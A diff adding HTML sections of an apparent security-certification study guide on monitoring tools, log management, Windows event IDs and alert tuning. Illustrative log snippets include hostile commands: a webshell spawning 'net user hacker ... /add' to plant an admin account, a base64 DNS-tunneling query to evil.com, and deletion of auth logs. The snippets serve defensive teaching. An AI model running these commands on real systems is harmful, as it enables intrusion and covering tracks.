+<span class="cr">Traditional AV: MISSES IT (no file, no signature)</span>
+
+<span class="cg">EDR behavior detection:</span>
+08:43:12 — winword.exe spawned powershell.exe ← SUSPICIOUS
+08:43:13 — PowerShell using -enc -nop -w hidden ← SUSPICIOUS
+08:43:14 — PowerShell attempting network connection ← SUSPICIOUS
+08:43:14 — <span class="cg">EDR KILLS powershell.exe process</span>
+08:43:14 — <span class="cg">winword.exe quarantined</span>
+08:43:15 — <span class="cg">Analyst alerted: "Fileless attack blocked"</span>
+08:43:15 — <span class="cg">Endpoint isolated pending investigation</span>
+
+Malware: never executed ✓
+Endpoint: clean ✓
+User: called for security awareness training
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">EDR →</span><span>Endpoint behavior monitoring — detects by WHAT it does, not what it is</span></div>
+      <div class="er"><span class="ek">EDR vs AV →</span><span>AV = signatures / EDR = behavioral — EDR catches zero-days</span></div>
+      <div class="er"><span class="ek">CrowdStrike →</span><span>Industry-leading EDR — cloud-native — lightweight agent</span></div>
+      <div class="er"><span class="ek">MDR →</span><span>Managed Detection & Response — outsourced SOC — 24/7 monitoring service</span></div>
+      <div class="er"><span class="ek">XDR →</span><span>Extended — unifies endpoint + network + cloud + email — full attack chain</span></div>
+      <div class="er"><span class="ek">Network isolation →</span><span>EDR cuts endpoint from network but keeps management connection for investigation</span></div>
+      <div class="er"><span class="ek">Fileless malware →</span><span>Runs in RAM — no file on disk — AV misses it — EDR behavior catches it</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 4. NETWORK TOOLS          -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s4">
+<div class="card">
+  <div class="card-hd"><span class="card-num">04</span><span class="card-title">Network Monitoring Tools</span><span class="bdg bdg-cyan">IDS · IPS · NetFlow · Packet</span></div>
+  <div class="card-bd">
+    <p>Network monitoring tools provide <strong style="color:var(--text)">visibility into traffic flowing across the network</strong> — who is talking to whom, what protocols, what volumes, and whether any of it looks malicious.</p>
+
+    <h3>IDS / IPS — Already Covered in Depth</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">IDS — Intrusion Detection System</h4>
+        <p>Out of band — receives copy of traffic. Detects and ALERTS only. Cannot block traffic. No impact on network performance. Good for passive monitoring of critical links.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Placement: SPAN port or network TAP
+Traffic copy → IDS → alert only
+Real traffic: flows regardless of IDS
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">IPS — Intrusion Prevention System</h4>
+        <p>Inline — all traffic passes through. Detects AND BLOCKS. Can drop malicious packets in real time. Risk: false positives block legitimate traffic. Performance impact possible.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Placement: Inline — between zones
+All traffic → IPS → pass or drop
+Bad traffic: dropped immediately
+        </div>
+      </div>
+    </div>
+
+    <h3>NetFlow Analysis</h3>
+    <div class="info-row">
+      <div class="info-icon">📊</div>
+      <div>
+        <div class="info-title" style="color:var(--teal)">What Is NetFlow?</div>
+        <div class="info-desc">NetFlow is a network protocol that records metadata about traffic flows — NOT the actual content. Records: source IP, destination IP, ports, protocol, bytes transferred, duration. Lightweight — no deep packet inspection needed. Cisco invented it (also: IPFIX = standardized version, sFlow = sampled version).</div>
+      </div>
+    </div>
+    <div class="code">
+<span class="cm"># NetFlow record example:</span>
+Src IP: 10.0.0.47    Dst IP: 185.220.101.34
+Src Port: 54321      Dst Port: 443
+Protocol: TCP        Bytes: 847,293,048 (847 MB)
+Start: 02:14:33      End: 02:47:12
+Duration: 32 minutes
+
+<span class="cm"># Analyst reads this as:</span>
+Internal workstation → suspicious external IP
+843 MB transferred over 32 minutes
+At 2am
+<span class="cr">= DATA EXFILTRATION INDICATOR ← investigate immediately</span>
+
+<span class="cm"># NetFlow can't tell WHAT was transferred</span>
+<span class="cm"># But volume + destination + time = enough for alert</span>
+<span class="cm"># Tools: SolarWinds NTA, Cisco Stealthwatch, ntopng, Kentik</span>
+    </div>
+
+    <h3>Packet Capture (PCAP)</h3>
+    <div class="code">
+<span class="cm"># Packet capture = capturing actual packet contents</span>
+
+Tools: Wireshark (GUI), tcpdump (CLI), NetworkMiner
+
+<span class="cb">When to use full packet capture:</span>
+  → Incident investigation (what exactly happened?)
+  → Malware analysis (what did it download?)
+  → Protocol debugging
+  → Forensic evidence collection
+
+<span class="cr">Limitations:</span>
+  → High storage requirements (1Gbps = 450GB/hour!)
+  → Privacy/legal concerns — captures ALL content
+  → Encrypted traffic: see metadata, not content
+  → Usually only deployed on specific segments
+
+<span class="cg">Common approach: NetFlow everywhere + PCAP on tap for key segments</span>
+<span class="cg">Or: trigger full PCAP capture when alert fires</span>
+    </div>
+
+    <h3>Network Detection and Response (NDR)</h3>
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🌐</span><span class="tool-name">NDR — Network Detection and Response</span><span class="tool-type">Behavioral Network Analysis</span></div>
+      <div class="tool-desc">Modern evolution of IDS/IPS. Uses ML/AI to detect network anomalies — not just signature matching. Establishes baseline of normal network behavior. Detects: lateral movement, C2 traffic, insider threats, data exfiltration — even in encrypted traffic (by analyzing metadata patterns). Examples: Darktrace, ExtraHop, Vectra AI, Cisco Stealthwatch.</div>
+      <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># NDR detects encrypted C2 traffic by behavior:</span>
+Can't decrypt: HTTPS traffic
+Can analyze: 
+  Connection timing: beaconing every 5 minutes exactly
+  Packet sizes: suspiciously uniform
+  Destination: newly registered domain
+  Certificate: self-signed, unusual attributes
+NDR: <span class="co">"This looks like C2 beaconing behavior"</span> → <span class="cr">ALERT</span>
+      </div>
+    </div>
+
+    <h3>DNS Monitoring</h3>
+    <div class="code">
+<span class="cm"># DNS = treasure trove of threat intelligence</span>
+
+Why monitor DNS:
+  Every C2 connection starts with DNS lookup
+  Malware often uses DNS for covert comms (DNS tunneling)
+  Domain generation algorithms (DGA) detectable
+  Known-bad domains blocked at DNS layer
+
+<span class="cb">DNS monitoring detects:</span>
+DNS tunneling:    excessively long DNS queries
+                  "<span class="cr">bWFsd2FyZWRhdGFleGZpbHRyYXRpb24=.evil.com</span>"
+                  (base64 encoded data in subdomain!)
+
+DGA malware:      malware generating random domains
+                  "<span class="cr">xjk23ndf.com, kdf93kls.net, qwer7823.org</span>"
+                  (rotating C2 domains to evade blacklists)
+
+Known bad domains: query to known malware C2 domain
+
+<span class="cm"># DNS security tools:</span>
+Cisco Umbrella (OpenDNS): cloud-based DNS security
+Infoblox: enterprise DNS monitoring
+Pi-hole: lightweight DNS blocker
+DNSBL: DNS-based blackhole lists
+    </div>
+
+    <h3>Other Network Monitoring Tools</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">SNMP Monitoring</h4>
+        <p>Simple Network Management Protocol — monitors network devices (switches, routers, firewalls). Tracks: interface utilization, error rates, uptime, CPU/memory. Alerts on device failure or unusual utilization. SNMPv3 = secure (encrypted + authenticated). SNMPv1/v2 = insecure.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Bandwidth Monitoring</h4>
+        <p>Track network utilization over time. Spike at 3am = potential exfiltration or attack. Unusual protocol traffic = indicator. Tools: PRTG, SolarWinds, Cacti, Grafana + Prometheus.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Wireless Monitoring (WIDS)</h4>
+        <p>Wireless Intrusion Detection System. Detects rogue access points, evil twin attacks, deauth floods, unauthorized clients. Monitors RF spectrum continuously. Enterprise APs often have WIDS built in.</p>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// SCENARIO — NetFlow Catches Data Exfiltration</div>
+      <div class="code">
+<span class="cm"># Insider threat — employee copying data before resignation:</span>
+
+NetFlow monitoring (SolarWinds NTA) shows:
+<span class="cr">Alert: Unusual outbound transfer</span>
+  Source: 192.168.10.47 (HR-Workstation-12)
+  Destination: 104.21.24.89 (Dropbox personal)
+  Volume: 4.7 GB transferred
+  Time: Tuesday 11pm-1am
+  Protocol: HTTPS (port 443)
+
+Additional context (SIEM correlates):
+  HR-Workstation-12 = Jane Doe's workstation
+  Jane Doe: submitted resignation 2 days ago
+  Badge: Jane entered office at 10:47 PM (abnormal)
+  DLP: 3 DLP alerts this week (ignored individually)
+
+<span class="cr">Combined alert: Probable data exfiltration by departing employee</span>
+
+<span class="cb">Response:</span>
+  Security team reviews next morning
+  HR and Legal notified immediately
+  Jane's network access suspended
+  Legal hold placed on Jane's workstation
+  Investigation launched
+
+<span class="co">Outcome: Files recovered from Dropbox via legal process</span>
+<span class="co">NetFlow + SIEM correlation caught what each alone missed</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">NetFlow →</span><span>Traffic metadata — src/dst IP, ports, bytes — NOT content — Cisco IPFIX standard</span></div>
+      <div class="er"><span class="ek">PCAP →</span><span>Full packet capture — actual content — Wireshark — high storage — incident investigation</span></div>
+      <div class="er"><span class="ek">NDR →</span><span>Network Detection & Response — ML-based — detects C2 even in encrypted traffic</span></div>
+      <div class="er"><span class="ek">DNS monitoring →</span><span>Detects DNS tunneling, DGA malware, C2 beaconing via DNS patterns</span></div>
+      <div class="er"><span class="ek">SNMP v3 →</span><span>Secure SNMP — encrypted + authenticated — v1/v2 = insecure</span></div>
+      <div class="er"><span class="ek">WIDS →</span><span>Wireless IDS — detects rogue APs, evil twins, deauth attacks</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 5. LOG MANAGEMENT         -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s5">
+<div class="card">
+  <div class="card-hd"><span class="card-num">05</span><span class="card-title">Log Management</span><span class="bdg bdg-yellow">Collect · Store · Analyze</span></div>
+  <div class="card-bd">
+    <p>Logs are the <strong style="color:var(--text)">evidence trail of everything that happens</strong> across systems. Effective log management means collecting the right logs, storing them securely, ensuring integrity, and keeping them long enough for investigations and compliance.</p>
+
+    <h3>Log Sources — What to Collect</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">System Logs</h4>
+        <ul>
+          <li>Windows Event Log (Security, System, Application)</li>
+          <li>Linux syslog (/var/log/auth.log, syslog)</li>
+          <li>macOS Unified Log</li>
+          <li>Kernel messages</li>
+          <li>Boot and startup events</li>
+          <li>Hardware events (disk errors, memory faults)</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Security Logs</h4>
+        <ul>
+          <li>Logon/logoff success and failure</li>
+          <li>Account lockouts</li>
+          <li>Privilege escalation</li>
+          <li>Object access (file, folder, registry)</li>
+          <li>Policy changes</li>
+          <li>Process creation (command line included)</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Network Device Logs</h4>
+        <ul>
+          <li>Firewall allow/deny logs</li>
+          <li>VPN connection logs</li>
+          <li>Router/switch syslog</li>
+          <li>DHCP lease assignments</li>
+          <li>DNS query logs</li>
+          <li>Proxy/web filter logs</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Application Logs</h4>
+        <ul>
+          <li>Web server (Apache, IIS, Nginx access logs)</li>
+          <li>Database query logs</li>
+          <li>Application errors and exceptions</li>
+          <li>Authentication logs (login attempts)</li>
+          <li>API access logs</li>
+          <li>Business application events</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Cloud Logs</h4>
+        <ul>
+          <li>AWS CloudTrail (API calls)</li>
+          <li>Azure Activity Log</li>
+          <li>GCP Cloud Audit Logs</li>
+          <li>Microsoft 365 Unified Audit Log</li>
+          <li>Container logs (Kubernetes)</li>
+          <li>Serverless function logs</li>
+        </ul>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">Physical Security Logs</h4>
+        <ul>
+          <li>Badge reader events (entry/exit)</li>
+          <li>CCTV recording metadata</li>
+          <li>Alarm system events</li>
+          <li>Data center access logs</li>
+          <li>Visitor management logs</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>Log Collection Methods</h3>
+    <div class="code">
+<span class="cm"># Three main collection approaches:</span>
+
+<span class="cb">1. Syslog (push-based):</span>
+   Devices push logs to central syslog server
+   Protocol: UDP port 514 (unencrypted)
+              TCP port 6514 (TLS encrypted — preferred)
+   Syslog-ng / rsyslog = common syslog servers
+   Simple, universal, supported by all network devices
+
+<span class="cb">2. Agent-based (pull-based):</span>
+   Agent installed on each system
+   Agent collects, filters, and forwards logs
+   More reliable — resends if connection lost
+   Examples: Splunk Universal Forwarder
+             Elastic Beats (Filebeat, Winlogbeat)
+             Microsoft Monitoring Agent (MMA)
+
+<span class="cb">3. API integration:</span>
+   Cloud services → pull via API
+   AWS CloudTrail → API → SIEM
+   Microsoft 365 → Graph API → SIEM
+   Salesforce → REST API → SIEM
+    </div>
+
+    <h3>Log Integrity</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--red)">Why Integrity Matters</h4>
+        <p>Attackers who compromise systems often try to delete or modify logs to cover their tracks. Local logs = easy to tamper with. Centralized logs = much harder. Append-only logs = can't be modified. WORM storage = cannot be changed after written.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Attacker compromises server:
+  Deletes /var/log/auth.log ← local logs gone
+  
+But SIEM already received those logs:
+  → Logs sent to SIEM seconds after creation
+  → Deletion of local copy doesn't affect SIEM
+  → Evidence preserved ✓
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">Integrity Methods</h4>
+        <ul>
+          <li>Centralized syslog — off system immediately</li>
+          <li>Append-only log storage</li>
+          <li>WORM (Write Once Read Many) storage</li>
+          <li>Cryptographic log signing (hash chain)</li>
+          <li>Immutable cloud storage (AWS S3 Object Lock)</li>
+          <li>Separate credentials for log system access</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>Log Retention Requirements</h3>
+    <div style="overflow-x:auto">
+    <table>
+      <tr><th>Regulation</th><th>Log Type</th><th>Minimum Retention</th><th>Notes</th></tr>
+      <tr><td><span class="tag tb">PCI-DSS</span></td><td>All audit logs</td><td>1 year (3 months online)</td><td>Req 10.7 — critical for cardholder data</td></tr>
+      <tr><td><span class="tag to">HIPAA</span></td><td>Security logs</td><td>6 years</td><td>Part of risk analysis requirements</td></tr>
+      <tr><td><span class="tag tg">SOX</span></td><td>Financial system logs</td><td>7 years</td><td>Financial reporting integrity</td></tr>
+      <tr><td><span class="tag tp">GDPR</span></td><td>Access to personal data</td><td>As needed</td><td>Must demonstrate compliance</td></tr>
+      <tr><td><span class="tag tt">NIST</span></td><td>Security event logs</td><td>3 years recommended</td><td>SP 800-92 guidance</td></tr>
+      <tr><td><span class="tag ti">General Best Practice</span></td><td>All security logs</td><td>90 days hot + 1 year cold</td><td>Minimum for most incident investigations</td></tr>
+    </table>
+    </div>
+
+    <h3>Time Synchronization — Critical for Logs</h3>
+    <div class="code">
+<span class="cm"># NTP — Network Time Protocol — essential for log correlation</span>
+
+Problem without NTP:
+  Server A clock: 14:32:15
+  Server B clock: 14:34:47 (2 min 32 sec ahead)
+  Firewall clock: 14:30:02 (2 min 13 sec behind)
+
+Incident timeline reconstruction:
+  14:32:15 — Server A: user logged in
+  14:30:02 — Firewall: connection allowed (BEFORE login?)
+  14:34:47 — Server B: file accessed (AFTER other events?)
+  <span class="cr">Timeline makes no sense → investigation fails</span>
+
+<span class="cg">With NTP — all clocks synchronized:</span>
+  14:32:15 — Firewall: connection allowed
+  14:32:15 — Server A: user logged in
+  14:32:16 — Server B: file accessed
+  <span class="cg">Timeline makes perfect sense → attack reconstructed ✓</span>
+
+NTP port: UDP 123
+Hierarchy: Stratum 0 (atomic clock) → Stratum 1 server → Stratum 2...
+All systems should sync to same authoritative NTP server
+    </div>
+
+    <h3>Windows Event IDs — Most Important for Exam</h3>
+    <div style="overflow-x:auto">
+    <table>
+      <tr><th>Event ID</th><th>What It Means</th><th>Security Significance</th></tr>
+      <tr><td><span class="tag tb">4624</span></td><td>Successful logon</td><td>Track who logged in, when, from where</td></tr>
+      <tr><td><span class="tag tr">4625</span></td><td>Failed logon</td><td>Brute force / password spray detection</td></tr>
+      <tr><td><span class="tag to">4648</span></td><td>Logon with explicit credentials</td><td>Pass-the-hash, lateral movement</td></tr>
+      <tr><td><span class="tag tp">4672</span></td><td>Special privileges assigned</td><td>Admin logon — monitor carefully</td></tr>
+      <tr><td><span class="tag tr">4698</span></td><td>Scheduled task created</td><td>Common persistence mechanism</td></tr>
+      <tr><td><span class="tag tr">4720</span></td><td>User account created</td><td>Unauthorized account creation</td></tr>
+      <tr><td><span class="tag tr">4732</span></td><td>User added to privileged group</td><td>Privilege escalation</td></tr>
+      <tr><td><span class="tag to">7045</span></td><td>New service installed</td><td>Malware persistence via service</td></tr>
+    </table>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// SCENARIO — Log Analysis Reconstructs Attack</div>
+      <div class="code">
+<span class="cm"># Post-incident investigation — reconstruct attack timeline:</span>
+
+SIEM search: events around compromised server last 7 days
+
+<span class="cy">Day 1 — Monday 09:14:</span>
+Firewall: <span class="cb">ALLOW</span> — 203.0.113.45:80 → web-server-01
+Web: <span class="cr">GET /wp-admin/xmlrpc.php HTTP/1.1</span> (brute force probe)
+
+<span class="cy">Day 1 — Monday 09:47:</span>
+Web: <span class="cr">POST /wp-admin/ — 200 OK</span> (successful login — "admin")
+Web: File upload → shell.php (webshell uploaded!)
+
+<span class="cy">Day 3 — Wednesday 02:11:</span>
+System: <span class="cr">Process: shell.php → cmd.exe → whoami</span>
+System: <span class="cr">Process: cmd.exe → net user hacker P@ss123 /add</span>
+System: <span class="cr">Event 4720: User "hacker" created</span>
+
+<span class="cy">Day 5 — Friday 23:45:</span>
+System: <span class="cr">Event 4732: hacker added to Administrators</span>
+System: <span class="cr">Event 4672: hacker logged on with admin</span>
+Network: <span class="cr">RDP session from hacker → internal servers</span>
+
+<span class="cg">Complete attack chain reconstructed from logs ✓</span>
+<span class="cg">Evidence preserved for legal action ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">Syslog →</span><span>UDP 514 (insecure) / TCP 6514 TLS (secure) — centralized log collection</span></div>
+      <div class="er"><span class="ek">NTP →</span><span>Time synchronization — UDP 123 — critical for log correlation across systems</span></div>
+      <div class="er"><span class="ek">WORM storage →</span><span>Write Once Read Many — log integrity — cannot be modified after written</span></div>
+      <div class="er"><span class="ek">Event 4625 →</span><span>Failed logon — brute force/password spray detection</span></div>
+      <div class="er"><span class="ek">Event 4624 →</span><span>Successful logon — track who logged in where when</span></div>
+      <div class="er"><span class="ek">Log retention →</span><span>PCI=1yr / HIPAA=6yr / SOX=7yr / Best practice=90 days hot + 1yr cold</span></div>
+      <div class="er"><span class="ek">Centralized logs →</span><span>Attacker can delete local logs — centralized logs preserved</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 6. ALERT TYPES            -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s6">
+<div class="card">
+  <div class="card-hd"><span class="card-num">06</span><span class="card-title">Alert Types & Tuning</span><span class="bdg bdg-red">TP · FP · FN · TN</span></div>
+  <div class="card-bd">
+    <p>Generating alerts is easy — generating <strong style="color:var(--text)">meaningful alerts</strong> is hard. Too many alerts causes alert fatigue. Too few means threats are missed. Tuning the alerting system is a critical ongoing security operations task.</p>
+
+    <h3>The Four Alert Outcomes</h3>
+    <div class="g2">
+      <div class="gc" style="border-color:#154028">
+        <h4 style="color:var(--green)">True Positive (TP) ✅</h4>
+        <p>Alert fired AND the threat is real. This is what we want — correctly identified attack. Analyst investigates and confirms malicious activity. Take action to respond.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Alert: "Ransomware behavior detected"
+Investigation: Confirmed — ransomware running
+Action: Isolate endpoint, initiate IR
+Result: <span class="cg">CORRECT DETECTION ✓</span>
+        </div>
+      </div>
+      <div class="gc" style="border-color:#2d0f0f">
+        <h4 style="color:var(--red)">False Positive (FP) ❌</h4>
+        <p>Alert fired BUT there's no actual threat. Legitimate activity mistaken for attack. Major source of alert fatigue — analysts waste time on non-issues. Too many FPs = analysts start ignoring alerts.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Alert: "Port scan detected from 10.0.0.5"
+Investigation: That's our vulnerability scanner
+               running its scheduled scan!
+Action: Tune rule to exclude scanner IP
+Result: <span class="cr">WASTED ANALYST TIME</span>
+        </div>
+      </div>
+      <div class="gc" style="border-color:#154028">
+        <h4 style="color:var(--green)">True Negative (TN) ✅</h4>
+        <p>No alert AND there's no threat. Normal activity correctly identified as benign. This is what happens for the vast majority of traffic. The system working correctly for non-attacks.</p>
+      </div>
+      <div class="gc" style="border-color:#4a2d10">
+        <h4 style="color:var(--orange)">False Negative (FN) ⚠️</h4>
+        <p>No alert BUT a real threat exists. MISSED ATTACK. Most dangerous outcome. Attacker operates undetected. Causes: outdated signatures, coverage gaps, evasion techniques. Regular threat hunting helps catch FNs.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Attacker uses novel technique — no rule for it
+SIEM: no alert generated
+Reality: attacker active for days
+Result: <span class="cr">BREACH GOES UNDETECTED</span>
+        </div>
+      </div>
+    </div>
+
+    <h3>Alert Fatigue — The Real Danger</h3>
+    <div class="code">
+<span class="cm"># Alert fatigue is one of the biggest real-world problems:</span>
+
+SOC analyst Monday morning:
+  Alert queue: <span class="cr">3,847 unreviewed alerts from weekend</span>
+  Analyst: overwhelmed, starts clicking "dismiss"
+  
+Reality: 3,800 false positives → safely dismissed
+         47 real attacks → ALSO dismissed (can't process all)
+
+<span class="cr">Alert fatigue killed: attacker hidden in noise</span>
+
+Real example (Target breach):
+  FireEye security system DID alert → twice
+  Alert buried in thousands of other alerts
+  Security team: overwhelmed, didn't prioritize it
+  Result: breach continued for weeks
+
+<span class="cg">Solutions to alert fatigue:</span>
+1. Tune rules → reduce false positives
+2. Prioritize → focus on high-severity first
+3. Automate → auto-close obvious false positives
+4. Enrich → add context so analyst decides faster
+5. SOAR → automate response for common alert types
+    </div>
+
+    <h3>Alert Types by Detection Method</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Signature-Based Alerts</h4>
+        <p>Match known attack patterns — CVE exploits, malware signatures, known bad IPs/domains/hashes. Low false positive rate for known threats. Zero detection of unknown threats. Must be continuously updated.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Example rules:
+"Alert if packet matches CVE-2017-0144 exploit"
+"Alert if hash matches known ransomware"
+"Alert if connection to known C2 IP"
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Anomaly / Threshold Alerts</h4>
+        <p>Alert when metrics exceed thresholds or deviate from baseline. Higher false positive rate — legitimate anomalies trigger. Catches unknown attacks. Requires good baseline establishment.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Example rules:
+"Alert if failed logins > 10 in 5 minutes"
+"Alert if data transfer > 1GB in 1 hour"
+"Alert if login from new country for user"
+"Alert if process count spikes 300%"
+        </div>
+      </div>
+    </div>
+
+    <h3>Alert Prioritization</h3>
+    <div class="alert-row" style="background:#2d0a0a;border-color:var(--red)">
+      <span class="alert-icon">🔴</span>
+      <span class="alert-name" style="color:var(--red)">P1 — Critical</span>
+      <span class="alert-desc">Confirmed active attack, ransomware, data breach in progress, business-critical system compromised</span>
+      <span class="alert-action" style="color:var(--red)">15 min response</span>
+    </div>
+    <div class="alert-row" style="background:#2d1a0a;border-color:var(--orange)">
+      <span class="alert-icon">🟠</span>
+      <span class="alert-name" style="color:var(--orange)">P2 — High</span>
+      <span class="alert-desc">Malware detected, suspicious admin activity, privilege escalation, lateral movement detected</span>
+      <span class="alert-action" style="color:var(--orange)">1 hour response</span>
+    </div>
+    <div class="alert-row" style="background:#2d2808;border-color:var(--yellow)">
+      <span class="alert-icon">🟡</span>
+      <span class="alert-name" style="color:var(--yellow)">P3 — Medium</span>
+      <span class="alert-desc">Unusual user behavior, policy violations, multiple failed logins, suspicious process execution</span>
+      <span class="alert-action" style="color:var(--yellow)">4 hour response</span>
+    </div>
+    <div class="alert-row" style="background:#0a1a2d;border-color:var(--blue)">
+      <span class="alert-icon">🔵</span>
+      <span class="alert-name" style="color:var(--blue)">P4 — Low</span>
+      <span class="alert-desc">Informational, routine events, low-risk anomalies, compliance-related logging</span>
+      <span class="alert-action" style="color:var(--blue)">Next business day</span>
+    </div>
+
+    <h3>Alert Tuning Best Practices</h3>
+    <div class="code">
+<span class="cm"># Practical alert tuning approach:</span>
+
+Step 1 — Inventory your alerts:
+  How many alerts per day?
+  What % are false positives?
+  Which rules generate most noise?
+  Which rules generate true positives?
+
+Step 2 — Tune the noisy rules:
+  Add exceptions for known-good IPs (vulnerability scanner)
+  Increase thresholds (10 failed logins → 50 for lab systems)
+  Add time conditions (alert only after-hours)
+  Exclude maintenance windows
+
+Step 3 — Enrich alerts with context:
+  Add: asset owner, asset criticality
+  Add: user role and department
+  Add: threat intel on source IP
+  Add: previous incident history
+  Result: analyst decides faster with more context
+
+Step 4 — Automate obvious ones:
+  Auto-close: known scanner IPs → "false positive"
+  Auto-respond: malware detected → auto-quarantine
+  SOAR playbooks handle routine alerts automatically
+
+Step 5 — Regular review:
+  Monthly: review alert volume and FP rate
+  Quarterly: review all active rules
+  Continuous: tune after each false positive
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">True positive →</span><span>Alert fired + real threat exists — correct detection</span></div>
+      <div class="er"><span class="ek">False positive →</span><span>Alert fired + no real threat — causes alert fatigue</span></div>
+      <div class="er"><span class="ek">False negative →</span><span>No alert + real threat exists — WORST outcome — attack missed</span></div>
+      <div class="er"><span class="ek">True negative →</span><span>No alert + no threat — normal activity correctly identified</span></div>
+      <div class="er"><span class="ek">Alert fatigue →</span><span>Too many false positives — analysts ignore alerts — real threats missed</span></div>
+      <div class="er"><span class="ek">Target breach →</span><span>FireEye alerted twice — ignored due to alert overload — classic alert fatigue</span></div>
+      <div class="er"><span class="ek">Tuning →</span><span>Reduce false positives — increase thresholds, add exceptions, add context</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 7. COMPUTING ACTIVITIES   -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s7">
+<div class="card">
+  <div class="card-hd"><span class="card-num">07</span><span class="card-title">Computing Resource Activities to Monitor</span><span class="bdg bdg-purple">What to Watch</span></div>
+  <div class="card-bd">
+    <p>Security monitoring must cover <strong style="color:var(--text)">specific activities on computing resources</strong>. Knowing what to look for — and why — is as important as having the tools.</p>
+
+    <h3>System Resource Monitoring</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--teal)">CPU Usage</h4>
+        <p>Sudden CPU spikes on server with no user activity = suspicious. Indicators of: cryptomining (sustained high CPU), malware running heavy computation, DoS attack consuming resources, large-scale data processing (exfiltration preparation).</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+Normal server: 5-20% CPU during business hours
+                2-5% CPU at night
+
+Alert trigger:
+  3am: CPU jumps to 95% → sustained
+  Process: svchost.exe with unusual parent
+  <span class="cr">Cryptominer or malware detected</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">Memory Usage</h4>
+        <p>Unusual memory consumption can indicate: fileless malware living in RAM, memory injection attacks, data being staged in memory before exfiltration, process hollowing (legitimate process hosting malware).</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Disk I/O</h4>
+        <p>High disk read activity suddenly = large-scale file access (staging for exfiltration or ransomware encryption scan). High disk write = data being written (ransomware encrypting files). Monitor for: disk encryption patterns, mass file creation/modification.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Network Utilization</h4>
+        <p>Unexpected outbound traffic spikes = potential exfiltration. Traffic to unusual destinations. Traffic at unusual times (3am data transfer). Protocol anomalies — internal server suddenly generating lots of DNS queries.</p>
+      </div>
+    </div>
+
+    <h3>Key Activities to Monitor</h3>
+
+    <div class="activity-item">
+      <div class="activity-dot" style="background:var(--red)"></div>
+      <div>
+        <div class="activity-title" style="color:var(--red)">Account and Authentication Activity</div>
+        <div class="activity-desc">Monitor every login event — success and failure. Failed logins (brute force), logins at unusual hours, logins from new geographic locations, logins to multiple systems rapidly (lateral movement), privileged account usage, service account behavior changes, new account creation, group membership changes.</div>
+        <div class="code" style="font-size:0.65rem;margin-top:0.4rem">
+Suspicious authentication patterns:
+  Password spray:    1 failed login each across 500 accounts
+  Brute force:       500 failed logins against 1 account
+  Pass-the-hash:     logon type 3 without password attempt
+  Impossible travel: login from NY then UK 30 minutes later
+  Golden ticket:     Kerberos ticket with unusual lifetime
+        </div>
+      </div>
+    </div>
+
+    <div class="activity-item">
+      <div class="activity-dot" style="background:var(--orange)"></div>
+      <div>
+        <div class="activity-title" style="color:var(--orange)">Privileged Activity Monitoring</div>
+        <div class="activity-desc">Admin and privileged actions carry highest risk — monitor them all. Admin logins, use of sudo/runas, changes to security policies, group policy modifications, backup/restore operations, security tool configuration changes, audit policy modifications (attacker covering tracks).</div>
+        <div class="code" style="font-size:0.65rem;margin-top:0.4rem">
+<span class="cr">CRITICAL alert triggers:</span>
+  Audit policy disabled → attacker covering tracks
+  AV/EDR stopped/uninstalled → attacker silencing defenses
